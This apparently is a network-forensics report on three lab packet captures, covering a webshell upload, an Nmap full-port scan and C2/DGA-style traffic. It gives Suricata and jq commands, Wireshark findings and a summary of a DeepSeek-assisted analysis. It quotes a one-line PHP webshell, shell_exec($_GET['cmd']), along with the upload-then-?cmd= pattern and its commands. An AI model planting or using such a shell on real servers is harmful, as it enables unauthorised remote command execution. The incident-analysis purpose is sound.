Suricata commands

Suricata reads a PCAP and writes its alerts into a file called eve.json. We then use the tool jq to pull out only the columns we need. Below are the commands from your terminal, followed by extra helper commands for checking the numbers.
A. Commands used in this investigation (from your terminal log) USED

Alert export, severity 1 and 2 only (.alert.severity < 3), as tab-separated fields: timestamp, source IP, destination IP, signature, severity. Run once per capture by changing the folder name:

jq -r ' select(.event_type == "alert" and .alert.severity < 3) | [ .timestamp, .src_ip, .dest_ip, .alert.signature, .alert.severity ] | @tsv ' ~/Desktop/suricata-output/C2-DGA/eve.json
CaptureFolder in the commandAlerts returned
C2 + DGA~/Desktop/suricata-output/C2-DGA/eve.json46
Nmap~/Desktop/suricata-output/nmap/eve.json38
Webshell~/Desktop/suricata-output/webshell/eve.json46

The same command with .alert.severity > 3 was also typed first, but the sudo password was entered wrongly three times, so it never ran (see the coverage note above). jq options: -r prints raw text, select(...) keeps matching records, [...] | @tsv turns the chosen fields into one tab-separated line.

About these images. They are terminal-style renderings generated from the exact command and output text you pasted. They are not screen captures of your machine. To replace them with real screenshots, run the commands in your terminal and use the same file names.
RENDERED FROM YOUR LOGFigure S1: C2-DGA alert export. Command with severity < 3 on C2-DGA/eve.json. 46 tab-separated rows: scan and C2 alerts from 00:07:36 to 00:20:31, the hex-label DNS alerts at 00:15:39, and the DGA burst to 8.8.8.8 at 00:18:46-52.
RENDERED FROM YOUR LOGFigure S2: Nmap alert export. Same command on nmap/eve.json. 38 rows, all severity 2: SYN scan, RST sweep, NULL, XMAS, and the long run of Nmap user-agent alerts at 21:47:12-13.
RENDERED FROM YOUR LOGFigure S3: Webshell alert export. Same command on webshell/eve.json. 46 rows, all severity 1, all 192.168.1.1 → 192.168.1.128 within 3.5 s. Note the single LFI alert at 11:29:41.999181.
B. Reference commands for reproducing and checking NOT IN YOUR LOG

These are standard Suricata and jq commands. The exact way you generated the eve.json files was not shown, so adjust paths and the rule file to your setup, and test before relying on them.

1. Run Suricata on a PCAP (offline mode; -l is the output folder, -k none skips checksum checks that often fail on captured traffic):

sudo suricata -c /etc/suricata/suricata.yaml -r ~/Desktop/pcaps/nmap.pcap -l ~/Desktop/suricata-output/nmap -k none

2. Validate the configuration and rules before running:

sudo suricata -T -c /etc/suricata/suricata.yaml

3. Count alerts and verify the totals (46 / 38 / 46):

jq -c 'select(.event_type == "alert")' eve.json | wc -l

4. Alerts per signature (how the signature counts in this report can be re-checked):

jq -r 'select(.event_type == "alert") | .alert.signature' eve.json | sort | uniq -c | sort -rn

5. Alerts per severity:

jq -r 'select(.event_type == "alert") | .alert.severity' eve.json | sort | uniq -c

6. Alerts per host pair (shows who talks to whom):

jq -r 'select(.event_type == "alert") | "\(.src_ip) -> \(.dest_ip)"' eve.json | sort | uniq -c | sort -rn

7. Add ports and protocol to the export (useful for the C2 port 4444 and DNS alerts):

jq -r 'select(.event_type == "alert") | [.timestamp, .src_ip, .src_port, .dest_ip, .dest_port, .proto, .alert.signature, .alert.severity] | @tsv' eve.json

8. Review DNS queries and HTTP requests logged by Suricata (if those log types are enabled in your config):

jq -r 'select(.event_type == "dns" and .dns.type == "query") | [.timestamp, .src_ip, .dns.rrname, .dns.rrtype] | @tsv' eve.json jq -r 'select(.event_type == "http") | [.timestamp, .src_ip, .http.http_method, .http.hostname, .http.url, .http.http_user_agent] | @tsv' eve.json

9. Human-readable alert log (written next to eve.json): cat fast.log

REALFigure 3: SYN scan. Filter tcp.flags.syn==1 && tcp.flags.ack==0 && ip.src==172.16.173.1. The scanner 172.16.173.1 sends SYN packets to many different ports of 172.16.173.138 at the same moment (starts in frame 23). 65,535 unique ports were probed in about 0.8 s.

Frame 132752 is a NULL packet (no flags, the info shows [<None>]) to port 22; frames with [FIN, SYN, PSH, URG] go to port 22 and [FIN, PSH, URG] to port 1. Normal programs never send these. REALFigure 6: Nmap fingerprint in HTTP. Filter http.user_agent contains "Nmap". The user-agent reads Nmap Scripting Engine, which names the tool outright.

C. C2 + DGA PCAP

REALFigure 7: Scan from .13 to .120. Filter ip.src==192.168.1.13 && ip.dst==192.168.1.120 && tcp.flags.syn==1 && tcp.flags.ack==0. SYNs to many ports from source port 56003 starting at frame 731 (00:07:36). Same-size, same-source-port packets to many ports = port scan.
REALFigure 8: Port 4444. Filter tcp.port==4444 && tcp.flags.syn==1 (60 packets). Frames 2436 and 7898 are scan probes from .13. From frame 11502 onward, .120 (client port 59341) tries to reach 192.168.1.13:4444 again and again; Wireshark marks them TCP Port numbers reused, meaning repeated connection attempts. Later flows (59342, 59343) connect and stay up for about 9 minutes.
REALFigure 9: Suspicious DNS. Filter dns && ip.src==192.168.1.120. .120 asks 8.8.8.8 for akfjqweklzx.com, pqowieurtyx.net, zmxncbvalkj.org and asdfghjklqwe.com (frames 45216 to 45600), plus reverse lookups of 8.8.8.8. Random letters and keyboard rows (asdfghjkl, qwe) are a DGA-style sign.
REALFigure 10: The "hex DGA" alert. Filter dns.qry.name contains "huaweicloudwaf". The long hex name is b5b249a2…cb0f8c9fec.vip1.huaweicloudwaf.com, sent by .13 to the router 192.168.1.1 (frame 30621). 5Manual Wireshark Findings

6.1 Webshell: the server was taken over CONFIRMED

The attacker used the website's upload form to put a small "remote control" file on the server, then typed commands into the web address, and the server obeyed.
StepWhat it meansEvidence (frames)Status
1 Upload attemptSend a file to the serverPOST /upload.php (26-27); page says "STORED - accepted"CONFIRMED
2 Webshell accessOpen the uploaded fileGET /uploads/shell.php?cmd=whoami (54), HTTP 200CONFIRMED
3 Command attemptsAsk it to run things15 commands (54-196)CONFIRMED
4 Remote code executionServer really ran themOutput: www-data (56), uid=33(www-data) (66), wazuh-server (76), passwd lines (138), listening ports (158), "may not run sudo" (188)CONFIRMED as www-data

The uploaded code is 135 bytes: shell_exec($_GET['cmd']). SHA-256 (computed from the PCAP): 851bf02112458d234ceb82c2cef033623c2aa4ebb44a0a246c08afac8ccf499a. Not proven: privilege escalation (sudo -l was denied), data theft, or movement to other hosts. A second file exploit.php (223 B) already existed in the upload folder, so earlier activity needs server-log review. Whether 192.168.1.1 was an authorised tester cannot be told from packets.

6.2 Nmap: reconnaissance CONFIRMED

Scanner 172.16.173.1 knocked on every door (port) of 172.16.173.138 to see which were open, then asked each open door what service lives behind it.
Phase (UTC+2)What happenedEvidence
21:45:23Full SYN scan65,541 SYNs to 65,535 ports in 0.81 s; ~65,557 RST/ACK replies
21:45:29 to 21:46:56Service probing every ~5 sProbes on 22, 80, 443, 1514, 1515, 55000 (GET / HTTP/1.0, OPTIONS / RTSP/1.0)
21:47:01 to :12OS-style probes20 NULL + 20 SYN/FIN/PSH/URG to port 22; 5 FIN/PSH/URG to port 1
21:47:12 to :13NSE web scripts28 requests with Nmap Scripting Engine user-agent
SYN, NULL and XMAS scans explained

SYN scan: send SYN and never finish the handshake. SYN-ACK = open, RST = closed. NULL scan: a packet with no flags. A closed port replies RST; an open one stays silent. XMAS scan: FIN+PSH+URG flags set ("lit like a Christmas tree"); same logic as NULL.

Here NULL/XMAS-style packets went to only one port each, which looks like Nmap OS detection (-O) rather than a full -sN/-sX sweep. Medium confidence: the exact command cannot be proven. No filtered ports are evidenced, because nearly all closed ports replied with RST.

6.3 C2 + DGA: backdoor-style traffic PARTLY CONFIRMED

C2 means "command and control": a hidden channel an attacker uses to control a computer. DGA means the malware invents random website names to find its boss.
FindingEvidenceStatus
Port scan .13 → .1204,482 SYNs; open: 445, 135, 139; two runs (source ports 56003, 41974)CONFIRMED
Connect-back to .13:4444.120 opens flows 59341, 59342, 59343 toward .13:4444 at 00:09:45, 00:11:31, 00:12:09CONFIRMED traffic, UNVERIFIED purpose
Long sessions59342: 545 s, 570,083 B of unique data toward .120 (1,138,706 B if retransmitted segments are counted), 10,029 B back. 59343: 503.6 s, 574,003 B unique (1,148,006 B raw), 21,597 B back. Each stream starts with a 4-byte length (bc e6 03 00 = 255,676) followed by a PE file (MZ header); see AI InvestigationCONFIRMED
BeaconingFlow 59341 shows 100 reset retries in ~20 s; later alerts sit inside two long sessions, not many short check-insSUSPICIOUS
Data exfiltrationThe big flow goes toward .120, only 10-22 KB leave itNOT EVIDENCED
DGA-like domains4 domains queried 00:18:46 to 00:18:52; 3 NXDOMAIN, asdfghjklqwe.com NOERROR with no answer records seenSUSPICIOUS, likely simulated

Hand-typed keyboard patterns and only four names suggest a lab simulation, not a real DGA (which would try hundreds). It is still a good detection example.

7AI Investigation Summary (DeepSeek)

Source and attribution. This section is a summary of an AI-assisted investigation made with DeepSeek and supplied by Youssef Amjad as Investigation-Report.pdf ("Network Attack Investigation, Weeks 2-3 Captures", dated 11 November 2026). The report says it used TShark 4.2.2 only, with no Zeek or Suricata. AI output can contain mistakes, so the key claims were re-checked against your PCAPs (table below). Anything not re-checked is labelled NOT RE-CHECKED. The full case-by-case detail is in the PDF; only the summary is kept here. Times follow the AI report (UTC = local time minus 2 h).
A second analyst, an AI, studied the same three captures without Suricata. It mostly agrees with the manual Wireshark work and adds three important details (summarised below): the file sent over port 4444 is a Windows DLL, the machine that was scanned is the same computer that was hacked through the webshell, and the DGA names come from a simple lab generator.

What the AI investigation concluded

Case 1: web shell compromise

CONFIRMED shell.php was uploaded through /upload.php on 192.168.1[.]128, then 15 commands ran through ?cmd= in 172 ms. Target: wazuh-server, Ubuntu 26.04.1, running as www-data.

Case 2: full-port recon

CONFIRMED 172.16.173[.]1 scanned all 65,535 TCP ports of 172.16.173[.]138 in about a second, found six open ports, then ran Nmap service detection and NSE scripts for about 2 minutes.

Case 3: payload delivery + DGA

CONFIRMED delivery, LIKELY C2. A 255,676-byte packed PE DLL (server.dll) crossed TCP/4444 twice. About 7 minutes later 192.168.1[.]120 queried four DGA-style domains.

Overall verdict

Recon (2026-11-07 19:41 UTC) was followed by compromise through an unrestricted file upload (2026-11-08 09:29 UTC). No lateral movement or data exfiltration is visible in these captures.

Verification against your PCAPs

What this adds or corrects in the earlier sections

  • Port 4444 content identified. The stream is a PE32+ DLL, not unknown binary data. Earlier sections called it unverified; they are updated.
  • Session size corrected. Each 4444 session carries about 570 KB of unique data. My earlier "~1.1 MB" added up retransmitted segments (143 segments were seen, only 86 unique sequence numbers). The data still flows toward 192.168.1.120, so there is still no exfiltration.
  • Scanned host = hacked host. 172.16.173.138 (Nmap target) and 192.168.1.128 (webshell victim) are two NICs of one server. That links the two captures into one kill chain: Nmap scan on 2026-11-07 (19:45 UTC), webshell on 2026-11-08 (09:29 UTC), roughly 13 h 45 min later.
  • Scanner evasion. Random TTL and IP-ID values on the SYN packets suggest a deliberately noisy or modified scanner, not default Nmap behaviour (intent is only possible).
  • New C2-side indicators. c2.dga-lab[.]com (never resolved), a 793 s TLS session to 102.132.97[.]54 (watchlist only), and the shared MAC address of .13 and .120.
Limits stated by the AI report: no Zeek or Suricata, so no IDS verdicts; payloads are packed or encrypted and were not run (packer identification is static); process-to-flow attribution needs host telemetry; .13 and .120 share a MAC; the 102.132.97.54 TLS session starts mid-stream so SNI and certificate are missing.
